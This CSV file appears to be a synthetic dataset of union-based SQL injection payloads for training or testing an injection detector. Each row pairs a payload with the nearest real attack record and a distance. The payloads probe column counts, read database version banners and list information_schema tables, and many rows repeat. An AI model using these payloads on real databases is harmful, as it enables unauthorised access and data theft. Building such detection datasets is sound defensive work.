id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000026,attack,union,"1""  )   where 2758  =  2758 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000263,8.879411838586783
CTGAN_000027,attack,union,"1  )   as biup where 1414  =  1414 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000222,7.290297230702501
CTGAN_000028,attack,union," select * from users where id  =  1 union select .1_,version  (    )   -- 1",nearest_attack_euclidean,R000027,5.188839791798945
CTGAN_000029,attack,union," select * from users where id  =  '1' union select $ _,@@VERSION -- 1'",nearest_attack_euclidean,R000109,6.819788377079321
CTGAN_000030,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000037,14.373129465310614
CTGAN_000031,attack,union,"1""   )    )     )   union all select null,null,null,null,null--",nearest_attack_euclidean,R000215,6.641855813802835
CTGAN_000032,attack,union,"1'+  (  select 'idmr' where 5029  =  5029 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000297,5.570971373249211
CTGAN_000033,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000208,6.499112102885405
CTGAN_000034,attack,union," select * from users where id  =  1 union select @ _,version  (    )   -- 1",nearest_attack_euclidean,R000125,8.858135350924897
CTGAN_000035,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000208,6.238816849892473
CTGAN_000036,attack,union," select * from users where id  =  1 or @`\` union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000197,4.819093198405957
CTGAN_000037,attack,union," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000034,6.986549163784917
CTGAN_000038,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000208,5.561070802528434
CTGAN_000039,attack,union,"1"" union all select null,null,null,null--",nearest_attack_euclidean,R000283,8.27398540832451
CTGAN_000040,attack,union,"1'  )   where 9842  =  9842 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000207,6.712796450570492
CTGAN_000041,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000014,5.784813041493377
CTGAN_000042,attack,union," select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000101,4.592644288437729
CTGAN_000043,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000045,3.844414916073556
CTGAN_000044,attack,union,"1%'   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000204,6.948823612984063
CTGAN_000045,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000094,4.405727171880015
CTGAN_000046,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000094,6.860116612100993
CTGAN_000047,attack,union," select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",nearest_attack_euclidean,R000057,6.344727572578488
CTGAN_000048,attack,union," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000004,6.0108335956522865
CTGAN_000049,attack,union," select * from users where id  =  1 union select .1_,version  (    )   -- 1",nearest_attack_euclidean,R000027,5.871424521426782
CTGAN_000050,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000166,6.432899473131941
CTGAN_000051,attack,union," select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",nearest_attack_euclidean,R000192,5.600883793699266
CTGAN_000052,attack,union," select * from users where id  =  1 +\. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000114,5.572583319893433
CTGAN_000053,attack,union," select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000074,5.943856191933605
CTGAN_000054,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000045,6.024984314987068
CTGAN_000055,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000208,6.808116970393998
CTGAN_000056,attack,union," select * from users where id  =  1 union select @<@$,version  (    )   -- 1",nearest_attack_euclidean,R000071,5.768409636156385
CTGAN_000057,attack,union," select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000073,4.80117665374073
CTGAN_000058,attack,union,"-6388'+  (  select 'jqld' where 8600  =  8600 union all select 8600,8600#",nearest_attack_euclidean,R000288,6.004607602424531
CTGAN_000059,attack,union,"-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--",nearest_attack_euclidean,R000255,6.088134227027308
CTGAN_000060,attack,union," select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000074,7.598724105236862
CTGAN_000061,attack,union," select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000059,6.133556744228932
CTGAN_000062,attack,union," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",nearest_attack_euclidean,R000112,4.810792773335195
CTGAN_000063,attack,union,"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000212,5.116567018408128
CTGAN_000064,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000180,6.85399773347165
CTGAN_000065,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000180,4.9094612654972245
CTGAN_000066,attack,union," select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000147,5.183849250365955
CTGAN_000067,attack,union," select * from users where id  =  1 or \<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000116,11.077955209465552
CTGAN_000068,attack,union," select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000065,11.389543013278239
CTGAN_000069,attack,union," select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000074,8.036147843448232
CTGAN_000070,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000045,5.535207891455423
CTGAN_000071,attack,union," select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000132,5.651542016159578
CTGAN_000072,attack,union,"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000212,7.992970199263314
CTGAN_000073,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000208,6.633833240908957
CTGAN_000074,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000180,4.614439193918261
CTGAN_000075,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000166,7.891560465541747
CTGAN_000076,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000045,4.529246030123434
CTGAN_000077,attack,union," select * from users where id  =  1 union select 1||@,version  (    )   -- 1",nearest_attack_euclidean,R000036,7.301384870157957
CTGAN_000078,attack,union,"-6940'  )   union all select 3042,3042,3042,3042,3042#",nearest_attack_euclidean,R000253,7.331085350484677
CTGAN_000079,attack,union," select * from users where id  =  1 or \+<\ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000124,5.837121021829948
CTGAN_000080,attack,union," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000015,5.985397531652303
CTGAN_000081,attack,union,"-9514   )    )    as xdkw where 4975  =  4975 union all select 4975,4975,4975,4975#",nearest_attack_euclidean,R000225,6.5026543252326965
CTGAN_000082,attack,union," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",nearest_attack_euclidean,R000012,4.979883568949187
CTGAN_000083,attack,union,"1""  )   where 2758  =  2758 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000263,5.752134789438111
CTGAN_000084,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000166,6.860668038301231
CTGAN_000085,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000180,3.936325410493993
CTGAN_000086,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000037,11.242485137254722
CTGAN_000087,attack,union," select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",nearest_attack_euclidean,R000192,6.457751000278321
CTGAN_000088,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000037,6.587310730988802
CTGAN_000089,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000272,6.857029049771626
CTGAN_000090,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000045,11.269988971120963
CTGAN_000091,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000094,5.388926527666567
CTGAN_000092,attack,union,"1'||  (  select 'hvqw' from dual where 4423  =  4423 union all select null,null,null--",nearest_attack_euclidean,R000289,7.699562501669593
CTGAN_000093,attack,union,"1  )   as biup where 1414  =  1414 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000222,6.598148662207372
CTGAN_000094,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000293,6.310256225867175
CTGAN_000095,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000208,6.277794604613261
CTGAN_000096,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000208,5.962249210571108
CTGAN_000097,attack,union," select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000117,5.00662985266843
CTGAN_000098,attack,union," select * from users where id  =  1 union select 1||@,version  (    )   -- 1",nearest_attack_euclidean,R000036,7.761862340247308
CTGAN_000099,attack,union," select * from users where id  =  1 -@<@ union select null,version  (    )   -- 1",nearest_attack_euclidean,R000198,6.6611530477444765
CTGAN_000100,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000064,5.875615001117938
CTGAN_000101,attack,union,"1'+  (  select dklk where 9862  =  9862 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000298,6.9766404741392005
CTGAN_000102,attack,union," select * from users where id  =  1 union select !<1,version  (    )   -- 1",nearest_attack_euclidean,R000048,6.945641339231438
CTGAN_000103,attack,union,"1'+  (  select 'idmr' where 5029  =  5029 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000297,6.506514844555303
CTGAN_000104,attack,union," select * from users where id  =  1 or $ 1  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000174,5.535437037266052
CTGAN_000105,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000271,5.958090423407635
CTGAN_000106,attack,union,"-3721'  )   union all select 9050,9050--",nearest_attack_euclidean,R000216,5.351663964351988
CTGAN_000107,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000172,5.357159604785303
CTGAN_000108,attack,union," select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000087,6.704539175942955
CTGAN_000109,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000094,6.245869921972747
CTGAN_000110,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000208,4.8397640909605935
CTGAN_000111,attack,union," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000034,3.6451930001889563
CTGAN_000112,attack,union," select * from users where id  =  1. union select null,version  (    )   -- 1",nearest_attack_euclidean,R000119,7.375299763641448
CTGAN_000113,attack,union," select * from users where id  =  1 union select 1<@,version  (    )   -- 1",nearest_attack_euclidean,R000061,6.211097470584185
CTGAN_000114,attack,union," select * from users where id  =  1 union select 1||@,version  (    )   -- 1",nearest_attack_euclidean,R000036,7.591529734098125
CTGAN_000115,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000014,6.781396407485202
CTGAN_000116,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000037,8.909401490256315
CTGAN_000117,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000208,4.856690842306059
CTGAN_000118,attack,union," select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000073,7.830866341571924
CTGAN_000119,attack,union," select * from users where id  =  1. union select null,version  (    )   -- 1",nearest_attack_euclidean,R000119,10.801314913426888
CTGAN_000120,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000180,5.513003901156022
CTGAN_000121,attack,union," select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000065,5.828037250211993
CTGAN_000122,attack,union," select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000074,6.387060140945027
CTGAN_000123,attack,union," select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",nearest_attack_euclidean,R000057,7.710502253631627
CTGAN_000124,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000166,7.156840984566967
CTGAN_000125,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000208,5.639701047666321
CTGAN_000126,attack,union,"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000212,6.219625238618317
CTGAN_000127,attack,union," select * from users where id  =  1 or @`\` union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000197,5.6353885397439525
CTGAN_000128,attack,union," select * from users where id  =  1 +$+ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000140,6.084128100657452
CTGAN_000129,attack,union," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000015,7.186500679166021
CTGAN_000130,attack,union,"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000212,3.5795736189521166
CTGAN_000131,attack,union," select * from users where id  =  1 union select .1_,version  (    )   -- 1",nearest_attack_euclidean,R000027,7.715671009012028
CTGAN_000132,attack,union," select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000104,4.744717641504457
CTGAN_000133,attack,union," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000008,7.410179243419996
CTGAN_000134,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000094,6.19488509195759
CTGAN_000135,attack,union," select * from users where id  =  1 union select 1||@,version  (    )   -- 1",nearest_attack_euclidean,R000036,7.912526608797613
CTGAN_000136,attack,union," select * from users where id  =  '1' union select \.%1,@@VERSION -- 1'",nearest_attack_euclidean,R000152,7.173278015248476
CTGAN_000137,attack,union," select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000074,4.798976737157577
CTGAN_000138,attack,union," select * from users where id  =  1 +   (  \+  )   union select null,@@VERSION -- 1",nearest_attack_euclidean,R000118,5.279603629701075
CTGAN_000139,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000166,6.220998901724623
CTGAN_000140,attack,union,"1""  )   where 2758  =  2758 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000263,5.782829841227918
CTGAN_000141,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000208,9.668959906871395
CTGAN_000142,attack,union," select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000074,5.569002655852594
CTGAN_000143,attack,union," select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000117,5.894859999753848
CTGAN_000144,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000099,7.262727702668886
CTGAN_000145,attack,union," select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",nearest_attack_euclidean,R000192,4.100524157839439
CTGAN_000146,attack,union," select * from users where id  =  1 union select 1||@,version  (    )   -- 1",nearest_attack_euclidean,R000036,5.420017382547117
CTGAN_000147,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000094,5.9524166703432755
CTGAN_000148,attack,union," select * from users where id  =  1. union select null,version  (    )   -- 1",nearest_attack_euclidean,R000119,4.824487864984062
CTGAN_000149,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000180,4.900691847314866
CTGAN_000150,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000208,5.26228502771961
CTGAN_000151,attack,union," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",nearest_attack_euclidean,R000112,17.070186331831966
CTGAN_000152,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000014,7.7600951605010495
CTGAN_000153,attack,union," select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",nearest_attack_euclidean,R000192,6.966222930676397
CTGAN_000154,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000094,4.013949851650758
CTGAN_000155,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000014,5.576126282411852
CTGAN_000156,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000166,4.904965849402921
CTGAN_000157,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000045,5.563495939942447
CTGAN_000158,attack,union," select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000126,4.3648901863034
CTGAN_000159,attack,union," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000033,4.434363905619266
CTGAN_000160,attack,union," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",nearest_attack_euclidean,R000011,4.052228431869541
CTGAN_000161,attack,union," select * from users where id  =  1 union select +!<1,version  (    )   -- 1",nearest_attack_euclidean,R000047,5.4348175116984905
CTGAN_000162,attack,union,"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000212,5.369846485667785
CTGAN_000163,attack,union," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000143,6.691526826864475
CTGAN_000164,attack,union,"-3933'   )    )     )   union all select 6198,6198,6198,6198,6198#",nearest_attack_euclidean,R000245,5.936590255271664
CTGAN_000165,attack,union," )   union select * from information_schema.tables,",nearest_attack_euclidean,R000077,15.758827300125724
CTGAN_000166,attack,union,"-2314%'   )    )    union all select 4612,4612--",nearest_attack_euclidean,R000292,6.276454012998433
CTGAN_000167,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000099,7.399081483840836
CTGAN_000168,attack,union," )   union select * from information_schema.tables,",nearest_attack_euclidean,R000077,13.072674022950775
CTGAN_000169,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000064,13.353883618380385
CTGAN_000170,attack,union," select * from users where id  =  1 or \.<1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000120,5.8729382207895275
CTGAN_000171,attack,union," select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000100,7.432243764689008
CTGAN_000172,attack,union," select * from users where id  =  '1' union select \,@@VERSION -- 1'",nearest_attack_euclidean,R000055,4.882464684089605
CTGAN_000173,attack,union," select * from users where id  =  1  <@. union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000190,6.3478641172705705
CTGAN_000174,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000208,5.519093193304231
CTGAN_000175,attack,union," select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000052,7.324100589484783
CTGAN_000176,attack,union," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",nearest_attack_euclidean,R000112,6.035240771960275
CTGAN_000177,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000282,5.677862227262991
CTGAN_000178,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000208,7.036483260572207
CTGAN_000179,attack,union," select * from users where id  =  1.*\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000200,5.351900134939989
CTGAN_000180,attack,union," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",nearest_attack_euclidean,R000112,5.92225605577981
CTGAN_000181,attack,union," select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000103,5.6075021242983185
CTGAN_000182,attack,union," )   union select * from information_schema.tables,",nearest_attack_euclidean,R000077,18.05134055960582
CTGAN_000183,attack,union,"1   )    )     )   union all select null,null,null,null,null--",nearest_attack_euclidean,R000301,6.76839780341321
CTGAN_000184,attack,union," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000004,5.512042600848374
CTGAN_000185,attack,union," select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000073,7.787980909479937
CTGAN_000186,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000180,6.014759022163546
CTGAN_000187,attack,union," select * from users where id  =  1 union select 1||@,version  (    )   -- 1",nearest_attack_euclidean,R000036,5.618827407889014
CTGAN_000188,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000014,9.062458116737973
CTGAN_000189,attack,union,"1'||  (  select 'hvqw' from dual where 4423  =  4423 union all select null,null,null--",nearest_attack_euclidean,R000289,5.734839854861514
CTGAN_000190,attack,union,"-9795  )   as wrgs where 5427  =  5427 union all select 5427,5427,5427,5427,5427,5427--",nearest_attack_euclidean,R000220,6.043777588069726
CTGAN_000191,attack,union," select * from users where id  =  1 union select +!<1,version  (    )   -- 1",nearest_attack_euclidean,R000047,5.392397639080683
CTGAN_000192,attack,union," select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000126,5.298960430031962
CTGAN_000193,attack,union," select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000073,8.156715720467666
CTGAN_000194,attack,union," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000004,7.146127617265495
CTGAN_000195,attack,union," select * from users where id  =  1 or $ 1  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000174,6.241708408488524
CTGAN_000196,attack,union,"1""  )   where 2758  =  2758 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000263,6.243168272847694
CTGAN_000197,attack,union,"-8566""  )   as hnch where 3418  =  3418 union all select 3418,3418,3418,3418,3418,3418,3418#",nearest_attack_euclidean,R000285,7.187311490061984
